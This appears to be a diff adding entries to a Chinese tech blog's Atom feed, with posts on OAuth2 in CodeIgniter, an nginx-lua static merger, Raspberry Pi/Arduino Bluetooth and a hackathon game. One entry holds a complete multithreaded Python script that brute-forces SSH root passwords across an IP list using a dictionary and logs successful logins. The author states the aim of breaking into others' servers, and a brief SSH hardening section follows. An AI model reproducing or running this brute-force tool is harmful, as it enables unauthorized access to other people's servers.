+    $this-&gt;server-&gt;addGrantType(new OAuth2\GrantType\ClientCredentials($this-&gt;storage, array(&quot;allow_credentials_in_request_body&quot; =&gt; true)));
+    $this-&gt;server-&gt;handleTokenRequest($this-&gt;request)-&gt;send();
+  }
+}
+</code></pre><p>###创建一个refresh_token服务</p>
+<pre><code>class Server{
+  function __construct(){
+    OAuth2\Autoloader::register();
+    $this-&gt;storage = new OAuth2\Storage\Pdo(array(&#39;dsn&#39; =&gt; &#39;mysql:dbname=oauth;host=localhost&#39;, &#39;username&#39; =&gt; &#39;&#39;, &#39;password&#39; =&gt; &#39;&#39;));
+    $this-&gt;server = new OAuth2\Server($this-&gt;storage, array(&#39;allow_implicit&#39; =&gt; true));
+    $this-&gt;request = OAuth2\Request::createFromGlobals();
+    $this-&gt;response = new OAuth2\Response();
+  }
+  public function refresh_token(){
+    $this-&gt;server-&gt;addGrantType(new OAuth2\GrantType\RefreshToken($this-&gt;storage, array(
+         &quot;always_issue_new_refresh_token&quot; =&gt; true,
+      &quot;unset_refresh_token_after_use&quot; =&gt; true,
+      &quot;refresh_token_lifetime&quot; =&gt; 2419200,
+    )));
+    $this-&gt;server-&gt;handleTokenRequest($this-&gt;request)-&gt;send();
+  }
+}
+</code></pre><h1 id="0x04-About-Package"><a href="#0x04-About-Package" class="headerlink" title="0x04.About Package"></a>0x04.About Package</h1><p>篇幅太大了，我觉定，把代码打包下来，好了。^.().^</p>
+<p><a href="http://785igi.com1.z0.glb.clouddn.com/share/build-oauth2-under-codeigniter.zip" target="_blank" rel="external">http://homeway.me/code/build-oauth2-under-codeigniter.zip</a></p>
+<p>下面是打包好的测试平台你也可以通过<a href="http://oauth2.homeway.me/oauth/test/" target="_blank" rel="external">http://oauth2.homeway.me/oauth/test/</a>来进入测试平台。</p>
+<p>平台web访问路径为：<code>/oauth/test/</code>、<code>/oauth2/RefreshToken</code>,<code>/oauth2/resource</code>,<code>/oauth2/authorize/token</code>,<code>/oauth2/PasswordCredentials</code>,<code>/oauth2/ClientCredentials</code>，你也可以从相应的源码中读到这些地址。</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-28-build-oauth2-under-codeigniter.jpg" alt="build-oauth2-under-codeigniter"></p>
+<p><hr><br></p>
+<p>参考：</p>
+<p>1.<a href="http://tools.ietf.org/html/rfc6749#section-4.3" target="_blank" rel="external">http://tools.ietf.org/html/rfc6749</a><br>2.<a href="http://brentertainment.com/oauth2/" target="_blank" rel="external">http://brentertainment.com/oauth2/</a><br>3.<a href="http://bshaffer.github.io/oauth2-server-php-docs/" target="_blank" rel="external">oauth2-server-php-docs</a><br>4.<a href="http://open.weibo.com/wiki/%E6%8E%88%E6%9D%83%E6%9C%BA%E5%88%B6%E8%AF%B4%E6%98%8E" target="_blank" rel="external">新浪oauth2授权机制说明</a><br>5.<a href="http://wiki.open.qq.com/wiki/mobile/OAuth2.0%E7%AE%80%E4%BB%8B" target="_blank" rel="external">腾讯OAuth2.0简介</a><br>6.<a href="http://connect.qq.com/sdk/webtools/index.html" target="_blank" rel="external">腾讯API调试平台</a></p>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-29-build-oauth2-under-codeigniter"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-29-build-oauth2-under-codeigniter" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/06/29/build-oauth2-under-codeigniter/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/06/29/build-oauth2-under-codeigniter/">http://homeway.me/2015/06/29/build-oauth2-under-codeigniter/</a></h4><p>-by小草</p>
+<p>2015-06-29 02:04:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-oauth2.png&quot; alt=&quot;Oauth2.0&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Oauth" scheme="https://homeway.me/tags/Oauth/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Nginx+Lua服务端合并静态文件</title>
+    <link href="https://homeway.me/2015/06/22/nginx-lua-static-merger/"/>
+    <id>https://homeway.me/2015/06/22/nginx-lua-static-merger/</id>
+    <published>2015-06-22T08:04:10.000Z</published>
+    <updated>2015-08-18T05:29:19.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-nginx-lua.png" alt="nginx-lua-static-merger"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>源码已经上传到github:<a href="https://github.com/grasses/nginx-lua-static-merger" target="_blank" rel="external">https://github.com/grasses/nginx-lua-static-merger</a></p>
+<p><code>nginx-lua-static-merger</code>是一个基于openresty的模块，主要用于合并静态文件，减少http请求，加快静态文件访问速度的模块。</p>
+<p>使用<code>nginx-lua-static-merger</code> 需要在编译nginx时候添加openresty的模块，或者直接安装openresty作为服务器。</p>
+<p><code>nginx-lua-static-merger</code>可以让你的js、css请求不要那么多，一个就够了。</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-22-nginx-lua-static-merger-look.jpg" alt="nginx-lua-static-merger"></p>
+<p><hr><br></p>
+<h1 id="0x02-About-Nginx"><a href="#0x02-About-Nginx" class="headerlink" title="0x02.About Nginx"></a>0x02.About Nginx</h1><h2 id="nginx工作"><a href="#nginx工作" class="headerlink" title="nginx工作"></a>nginx工作</h2><p>先从nginx原理来看nginx处理http请求的过程。</p>
+<p>Nginx的模块从功能上分为如下三类:</p>
+<p>Handlers（处理器模块），直接处理请求，并进行输出内容和修改headers信息等操作。Handlers处理器模块一般只能有一个。</p>
+<p>Filters （过滤器模块），主要对其他处理器模块输出的内容进行修改操作，最后由Nginx输出。</p>
+<p>Proxies （代理类模块），Nginx的HTTP Upstream之类的模块，这些模块主要与后端一些服务比如FastCGI等进行交互，实现服务代理和负载均衡等功能。</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-22-nginx-lua-static-merger-nginx-handler-http.png" alt="nginx 处理http请求"></p>
+<p>也就是说，一个http请求过来，nginx先处理请求信息，然后过滤信息，最后丢给代理来处理，它本身处理的东西并不多，它仅仅是通过查找配置文件将此次请求映射到一个location block，而此location中所配置的各个指令则会启动不同的模块去完成工作。</p>
+<p>从正常来看，一个页面加载10来个js、css是正常的，还有10来个图片，即使是什么也不干，那么一个页面也要处理掉20多个http请求，每个http请求都要跑一遍TCP请求，nginx回应，过滤，分配。</p>
+<h2 id="speed-test："><a href="#speed-test：" class="headerlink" title="speed test："></a>speed test：</h2><p>看张图吧，国外一个网速测试工具：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-22-nginx-lua-static-merger-reguest.jpg" alt="一个页面请求消耗的时间"></p>
+<p>去掉首页<code>index.html</code>的加载时间，可以看到，加载静态文件css，js时间耗费了很长的等待时间，并且image的加载是在js和css加载完后才加载的，也就是说，如果js或css加载慢了，那么页面就慢了。</p>
+<p>这个页面是github.com/grasses。</p>
+<p><hr><br></p>
+<h1 id="0x02-Usage"><a href="#0x02-Usage" class="headerlink" title="0x02.Usage"></a>0x02.Usage</h1><h2 id="Openresty"><a href="#Openresty" class="headerlink" title="Openresty"></a>Openresty</h2><p><a href="http://openresty.org/cn/" target="_blank" rel="external">http://openresty.org/cn/</a></p>
+<p>Openresty是国人写的开源项目，打包了标准的 Nginx 核心，很多的常用的第三方模块，以及它们的大多数依赖项。</p>
+<pre><code>tar xzvf ngx_openresty-VERSION.tar.gz
+cd ngx_openresty-VERSION/
+./configure
+make
+make install
+</code></pre><p>详细的安装教程还是去看官网吧。</p>
+<h2 id="file-path"><a href="#file-path" class="headerlink" title="file path"></a>file path</h2><pre><code>|--/usr/local/openresty/nginx
+|                        `--lua 
+|                            `--nginx-lua-static-merger.lua
+|                        `--conf 
+|                            `--nginx.lua
+|--/www/openresty/static
+|                `--js
+|                `--css
+|                `--cache
+</code></pre><p>注意</p>
+<p>1、<code>nginx.conf</code>中的<code>lua_package_path &quot;/usr/local/openresty/lualib/?.lua;;&quot;;</code>和<br><code>lua_package_cpath &quot;/usr/local/openresty/lualib/?.so;;&quot;;</code>，如果你是编译nginx而不是直接安装openresty，目录记得放对。</p>
+<p>2、确保<code>/www/openresty/static</code>有Lua写的权限。</p>
+<h2 id="use"><a href="#use" class="headerlink" title="use"></a>use</h2><p>前端调用方法如下：</p>
+<pre><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;/bootstrap/css/bootstrap.min.css;/qiniu/css/main.css;/css/navbar.css&quot;&gt;
+&lt;script src=&quot;/js/jquery.min.js;/js/main.js;/qiniu/bootstrap/js/bootstrap.min.js;/qiniu/js/plupload/plupload.full.min.js;/qiniu/js/plupload/i18n/zh_CN.js&quot;&gt;&lt;/script&gt;
+</code></pre><p><hr><br></p>
+<h1 id="0x03-How-it-work"><a href="#0x03-How-it-work" class="headerlink" title="0x03.How it work"></a>0x03.How it work</h1><p>Nginx在location通过 <code>content_by_lua_file</code> 把接下来的处理丢个Lua做逻辑。</p>
+<p>Lua通过uri进行md5编码，判断cache是否存在，如果cache不存在，循环分割、遍历uri，访问响应的路径，查找静态文件，存在则记录，最后写cache入文件，方便下次访问。</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-22-nginx-lua-static-merger-how-work.jpg" alt="how nginx-lua-static-merger work"></p>
+<p><hr><br></p>
+<h1 id="0x04-Effect"><a href="#0x04-Effect" class="headerlink" title="0x04.Effect"></a>0x04.Effect</h1><p>下面是在不作处理情况请求多个js结果：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-22-normal_http_get.jpg" alt="不做处理"></p>
+<p>下面是第一次请求下，lua既要获取数据又要合并生成cache，属于冷数据：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-22-cold_js_by_ngx_static_merger_2.jpg" alt="cold_js_by_ngx_static_merger"></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-22-cold_js_by_ngx_static_merger_1.jpg" alt="cold_js_by_ngx_static_merger"></p>
+<p>第二次访问就是热数据了，访问速度是增加的：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-22-hot_js_time.jpg" alt="热数据"></p>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-22-nginx-lua-static-merger"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-22-nginx-lua-static-merger" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/06/22/nginx-lua-static-merger/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/06/22/nginx-lua-static-merger/">http://homeway.me/2015/06/22/nginx-lua-static-merger/</a></h4><p><br><br>-by小草</p>
+<p>2015-06-22 20:04:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-nginx-lua.png&quot; alt=&quot;nginx-lua-static-merger&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Nginx" scheme="https://homeway.me/tags/Nginx/"/>
+    
+      <category term="Lua" scheme="https://homeway.me/tags/Lua/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python多线程ssh爆破</title>
+    <link href="https://homeway.me/2015/06/20/python-violence-ssh-attack/"/>
+    <id>https://homeway.me/2015/06/20/python-violence-ssh-attack/</id>
+    <published>2015-06-20T11:07:54.000Z</published>
+    <updated>2015-08-04T13:58:33.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-python.png" alt="Python"></p>
+<a id="more"></a>
+<p><br><hr><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>这几天发现朋友的服务器22被人爆了，于是想想，也想去爆别人服务器。</p>
+<p>爆弱口令时候写的一个python小脚本，主要功能是实现使用字典多线程爆破ssh，支持ip表导入，字典数据导入。</p>
+<p>主要使用到的是python的paramiko模块和多线程threading模块。</p>
+<p>那么，首先要准备的是字典dict、服务器ip表。</p>
+<p>东西很简单，主要默认目录如下：</p>
+<pre><code>|--ssh.scan.py
+|--/log:
+    sshd
+|--/dict:
+    ip
+    password
+</code></pre><p>ip和password按照一行一个放置。</p>
+<p><hr><br></p>
+<h1 id="0x02-Code"><a href="#0x02-Code" class="headerlink" title="0x02.Code"></a>0x02.Code</h1><p>下面上源码吧，文件保存为<code>ssh.scan.py</code>，查看使用方式：<code>python ssh.scan.py -h</code></p>
+<pre><code>#!/usr/bin/python python
+# -*- coding: utf-8 -*-
+import paramiko,threading,sys,time,os
+
+class SSHThread(threading.Thread):
+    def __init__(self, ip, port, timeout, dic, LogFile):
+        threading.Thread.__init__(self)
+        self.ip = ip
+        self.port = port
+        self.dict = dic
+        self.timeout = timeout
+        self.LogFile = LogFile
+    def run(self):
+        print(&quot;Start try ssh =&gt; %s&quot; % self.ip)
+        username = &quot;root&quot;
+        try:
+            password = open(self.dict).read().split(&#39;\n&#39;)
+        except:
+            print(&quot;Open dict file `%s` error&quot; % self.dict)
+            exit(1)
+        for pwd in password:
+            try:
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(self.ip, self.port, username, pwd, timeout = self.timeout)
+                print(&quot;\nIP =&gt; %s, Login %s =&gt; %s \n&quot; % (self.ip, username, pwd))
+                open(self.LogFile, &quot;a&quot;).write(&quot;[ %s ] IP =&gt; %s, port =&gt; %d, %s =&gt; %s \n&quot; % (time.asctime( time.localtime(time.time()) ), self.ip, self.port, username, pwd))
+                break
+            except:
+                print(&quot;IP =&gt; %s, Error %s =&gt; %s&quot; % (self.ip, username, pwd))
+                pass
+def ViolenceSSH(ip, port, timeout, dic, LogFile):
+    ssh_scan = SSHThread(ip, port, timeout, dic, LogFile)
+    ssh_scan.start()
+
+def main(ipFile, dic, log):
+    if ipFile == &quot;-h&quot;:
+        help()
+    try:
+        ipText = open(ipFile).read().split(&#39;\n&#39;)
+        for ip in ipText:
+            if ip != &#39;&#39;:
+                time.sleep(0.5)
+                threading.Thread(target = ViolenceSSH, args = (ip, 22, 1, dic, log, )).start()
+    except:
+        print(&quot;Open IP list file `%s` error&quot; % ipFile)
+        exit(1)
+def help():
+    print(&quot;python ssh.scan.py 使用说明:\n\
+        python ssh.scan.py ip_file_path dict_file_path ssh_log_path \n&quot;)
+    exit(1)
+
+if __name__ == &#39;__main__&#39;:
+
+    fpath = os.path.dirname(os.path.abspath(&#39;__file__&#39;))
+    ipFile = sys.argv[1] if len(sys.argv) &gt; 1 else fpath+&quot;/dict/ip&quot; 
+    dic = sys.argv[2] if len(sys.argv) &gt; 2 else fpath+&quot;/dict/password&quot;
+    log = sys.argv[3] if len(sys.argv) &gt; 3 else fpath+&quot;/log/sshd&quot;
+    try:
+        os.system(&quot;clear&quot;)
+        main(ipFile, dic, log)
+    except KeyboardInterrupt:
+        exit(1)
+</code></pre><p>结果比较丑，自己爆自己服务器：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-20-python-violence-ssh-attack-1.jpg" alt="爆破结果"></p>
+<p><hr><br></p>
+<h1 id="0x03-Solution"><a href="#0x03-Solution" class="headerlink" title="0x03.Solution"></a>0x03.Solution</h1><p>怎么办呢？防止被人爆菊，那就修改ssh默认登陆端口吧。修改方式主要是修改ssh配置文件：</p>
+<h2 id="1-修改iptables"><a href="#1-修改iptables" class="headerlink" title="1.修改iptables"></a>1.修改iptables</h2><p>首先要过防火墙，修改防火墙规则：</p>
+<p><code>/sbin/iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 2333 -j ACCEPT</code></p>
+<p>保存规则：</p>
+<p><code>service iptables save</code></p>
+<p>重启防火墙：</p>
+<p><code>service iptables restart</code></p>
+<h2 id="2-修改ssh配置文件"><a href="#2-修改ssh配置文件" class="headerlink" title="2.修改ssh配置文件"></a>2.修改ssh配置文件</h2><p><code>cp /etc/ssh/ssh_config   /etc/ssh/ssh_config.bak</code><br><code>cp /etc/ssh/sshd_config  /etc/ssh/sshd_config.bak</code></p>
+<p>修改ssh端口：</p>
+<p><code>vim /etc/ssh/sshd_config</code></p>
+<p>在端口#Port 22下面增加Port 2333</p>
+<p><code>vim /etc/ssh/ssh_config</code></p>
+<p>在端口#Port 22下面增加Port 2333</p>
+<p>重启ssh服务：</p>
+<p><code>service sshd restart</code></p>
+<h2 id="3-其他修改"><a href="#3-其他修改" class="headerlink" title="3.其他修改"></a>3.其他修改</h2><p>限制用户的SSH访问</p>
+<p>假设我们只要xiaocao和homeway用户能通过SSH使用系统，向sshd_config配置文件中添加</p>
+<p><code>vim /etc/ssh/sshd_config</code></p>
+<p>修改下面一行：</p>
+<p>AllowUsers xiaocao homeway</p>
+<p><br></p>
+<p>代码下载地址：<a href="http://homeway.me/code/python-violence-ssh.zip">http://homeway.me/code/python-violence-ssh.zip</a></p>
+<p><br><hr><br></p>
+<h5 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-20-python-violence-ssh-attack"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-20-python-violence-ssh-attack" class="headerlink" title="本文出自 夏日小草,转载请注明出处: http://homeway.me/2015/06/20/python-violence-ssh-attack"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/06/20/python-violence-ssh-attack"> http://homeway.me/2015/06/20/python-violence-ssh-attack</a></h5><p><br></p>
+<p>-by小草</p>
+<p>2015-06-20 19:59:54</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-python.png&quot; alt=&quot;Python&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Python" scheme="https://homeway.me/tags/Python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Raspberry与Arduino通过蓝牙通信</title>
+    <link href="https://homeway.me/2015/06/13/raspberry-connect-to-arduion-by-bluetooth/"/>
+    <id>https://homeway.me/2015/06/13/raspberry-connect-to-arduion-by-bluetooth/</id>
+    <published>2015-06-13T14:34:20.000Z</published>
+    <updated>2015-08-04T13:59:34.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-arduino.png" alt="Arduino"></p>
+<a id="more"></a>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>之前写过一篇关于Arduino通过串口与Raspberry通信的文章，<a href="http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/">http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/</a>，后来找到解决办法，通过主动唤醒被动。让一方主动发起通信，类似心跳包，另一方只保持等待读取一行，这样就不会导致双方同时存在一个计时器，定时发送数据。</p>
+<h1 id="0x02-Coding"><a href="#0x02-Coding" class="headerlink" title="0x02.Coding"></a>0x02.Coding</h1><p>这里蓝牙串口默认波特率9600，所以先要修改树莓派串口波特率：<a href="http://blog.miguelgrinberg.com/post/a-cheap-bluetooth-serial-port-for-your-raspberry-pi" target="_blank" rel="external">http://blog.miguelgrinberg.com/post/a-cheap-bluetooth-serial-port-for-your-raspberry-pi</a></p>
+<p>首先做配对，关于蓝牙与蓝牙之间配对指令集，需要查阅说明书。</p>
+<p>先是Arduino一方代码：</p>
+<pre><code>char line[512] = &quot;&quot;;   // 传入的串行数据
+int ret = 0;
+
+void setup() {
+  Serial.begin(9600);
+  Serial.println(&quot;&quot;);
+}
+void loop() {
+    //纯口可用时操作 
+    if (Serial.available() &gt; 0) {
+        // 读取传入的数据:  读到\n为止，或者最多512个字符
+        ret = Serial.readBytesUntil(&#39;\n&#39;, line, 512);
+        Serial.println(&quot;Arduino Receive =&gt; &quot; + line);
+    }
+    delay(300); 
+}
+</code></pre><p>然后是关于树莓派代码：</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+
+import time,sys
+import serial
+port = &quot;/dev/ttyACM0&quot;
+
+class Communicate:
+    def __init__(self, device):
+        self.device = device
+        self.Seral = serial.Serial(device)
+
+    def send(self, msg):
+        self.Seral.write(msg)
+        print(&quot;Raspberry Send =&gt; &quot; + time.strftime(&quot;%Y-%m-%d %X\t&quot;) + msg)
+
+    def readLine(self):
+        line = self.Seral.readline()
+        #print(&quot;Raspberry Receive =&gt; &quot; + time.strftime(&quot;%Y-%m-%d %X\t&quot;) + line.strip())
+        return line
+
+    def main(self):
+        line = self.readLine()
+        while(line):
+            try:
+                line = self.readLine()
+            except EOFError:
+                print(&quot;No data&quot;)
+
+if __name__ == &#39;__main__&#39;:
+    try:
+        conn = Communicate(sys.argv[1] if len(sys.argv) &gt; 1 else port)
+        conn.main()
+    except KeyboardInterrupt:
+        print(&quot;ERROR&quot;)
+        exit()
+</code></pre><p>串口地址默认<code>/dev/ttyACM0</code>，可以移植到电脑上，相应地修改串口地址就好了。</p>
+<p>Python处理串口部分主要就是-&gt;接收-&gt;反馈。</p>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-06-13-raspberry-connect-to-arduion-by-bluetooth"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-06-13-raspberry-connect-to-arduion-by-bluetooth" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/06/13/raspberry-connect-to-arduion-by-bluetooth/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/06/13/raspberry-connect-to-arduion-by-bluetooth/">http://homeway.me/2015/06/13/raspberry-connect-to-arduion-by-bluetooth/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-06-13 22:46:20</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-arduino.png&quot; alt=&quot;Arduino&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Work" scheme="https://homeway.me/categories/Work/"/>
+    
+    
+      <category term="树莓派" scheme="https://homeway.me/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
+    
+      <category term="Arduino" scheme="https://homeway.me/tags/Arduino/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>基于Raspberry的打地鼠游戏</title>
+    <link href="https://homeway.me/2015/05/26/play-hamster-game-through-raspberry/"/>
+    <id>https://homeway.me/2015/05/26/play-hamster-game-through-raspberry/</id>
+    <published>2015-05-26T05:59:20.000Z</published>
+    <updated>2015-08-04T13:47:44.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-raspberry-pi.png" alt="Raspberry-Pi"></p>
+<a id="more"></a>
+<p><br><hr><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>这是2015安控杯黑客马拉松的获奖作品，获得了第二名。</p>
+<p>关于源码，已经上传到github上了。<a href="https://github.com/HDU-HackDay/DrummerKing" target="_blank" rel="external">https://github.com/HDU-HackDay/DrummerKing</a></p>
+<p>游戏通过树莓派接通3个传感器，对应3个鼓面，开始游戏时候，web端跳出地鼠，通过敲击对应鼓面打击地鼠得分。</p>
+<p>其实这个游戏应该很像3月在上海参加的沪港Hackathon的作品：<a href="http://homeway.me/2015/03/30/play-music-through-senses/">http://homeway.me/2015/03/30/play-music-through-senses/</a></p>
+<p>这应该是我第六次参加Hackathon比赛了，大概也走出一套模式了。</p>
+<p>个人对Hacakathon的见解是：是一个很好的平台，去做一些好玩的东西，去认识一些创客，沾染一些Geek精神。</p>
+<p>所以，参加Hackathon这么多次，我没有固定的队友，基本没有第二次的队友，但每次都有认识新的队友，并且在一个短暂的时间，相互磨合，协调合作完成一个作品，并且尽可能地让这个东西稳定。</p>
+<p><br><hr></p>
+<h1 id="0x02-About-Game"><a href="#0x02-About-Game" class="headerlink" title="0x02.About Game"></a>0x02.About Game</h1><h3 id="1-作品长相："><a href="#1-作品长相：" class="headerlink" title="1.作品长相："></a>1.作品长相：</h3><p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-3.jpg" alt="打地鼠游戏"></p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-7.jpg" alt="打地鼠游戏"></p>
+<p>3个大鼓，都是用现场时间做的，其中鼓面的盖子还是用现场的零食盒子所做。</p>
+<p>也算是合理使用资源和时间吧。</p>
+<h3 id="2-看下视频效果吧："><a href="#2-看下视频效果吧：" class="headerlink" title="2.看下视频效果吧："></a>2.看下视频效果吧：</h3><video src="http://xiaocao.u.qiniudn.com/blog/play-hamster-game-through-raspberry-medium.mp4" controls="controls"></video>
+
+<p>高清视频可以在这里下载：<a href="http://xiaocao.u.qiniudn.com/blog/play-hamster-game-through-raspberry-big.mp4" target="_blank" rel="external">http://xiaocao.u.qiniudn.com/blog/play-hamster-game-through-raspberry-big.mp4</a></p>
+<h3 id="3-逻辑原理图："><a href="#3-逻辑原理图：" class="headerlink" title="3.逻辑原理图："></a>3.逻辑原理图：</h3><p><img src="http://xiaocao.u.qiniudn.com/blog/play-hamster-game-through-raspberry-6.png" alt="游戏逻辑"></p>
+<p>通过websocket将两个client客户端连接起来，其中Raspberry端主要负责采集数据，并把数据发送给服务器端，而服务器端主要负责将数据转发给web客户端，web客户端收到数据，处理数据逻辑。</p>
+<p>代码方面，Server主要用php的websocket，Client中web端主要用js显示效果以及做逻辑判断，Client端中Raspberry使用Python处理GPIO以及websocket发送数据包等。</p>
+<p>其中Python方面使用到了Websocket模块，Github请看：<a href="https://github.com/liris/websocket-client" target="_blank" rel="external">https://github.com/liris/websocket-client</a></p>
+<p><br><hr></p>
+<h1 id="0x03-About-Team"><a href="#0x03-About-Team" class="headerlink" title="0x03.About Team"></a>0x03.About Team</h1><p>本次比赛队员大部分为本校，有一个很好的前端，是校外的。</p>
+<p>其实和之前非常相似，每次参加Hacakathon都会遇到很棒的Geek一起作战。</p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-2.jpg" alt="队伍"></p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-1.jpg" alt="获奖"></p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-5.jpg" alt="Hack Day"></p>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-05-26-play-hamster-game-through-raspberry"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-05-26-play-hamster-game-through-raspberry" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/05/26/play-hamster-game-through-raspberry/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/05/26/play-hamster-game-through-raspberry/">http://homeway.me/2015/05/26/play-hamster-game-through-raspberry/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-05-26 23:22:20</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-raspberry-pi.png&quot; alt=&quot;Raspberry-Pi&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Work" scheme="https://homeway.me/categories/Work/"/>
+    
+    
+      <category term="树莓派" scheme="https://homeway.me/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Nginx重定向Rewrite分析</title>
+    <link href="https://homeway.me/2015/05/22/nginx-rewrite-conf/"/>
+    <id>https://homeway.me/2015/05/22/nginx-rewrite-conf/</id>
+    <published>2015-05-22T08:28:10.000Z</published>
+    <updated>2015-08-04T14:02:53.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-nginx.png" alt="nginx-reverse-proxy-conf"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>之前写过Nginx重定向了，<a href="http://homeway.me/2014/10/28/nginx-reverse-proxy-conf/">http://homeway.me/2014/10/28/nginx-reverse-proxy-conf/</a>，但当时比较模糊。</p>
+<p>这里主要说两种常用的重定向，都是php中的重定向。</p>
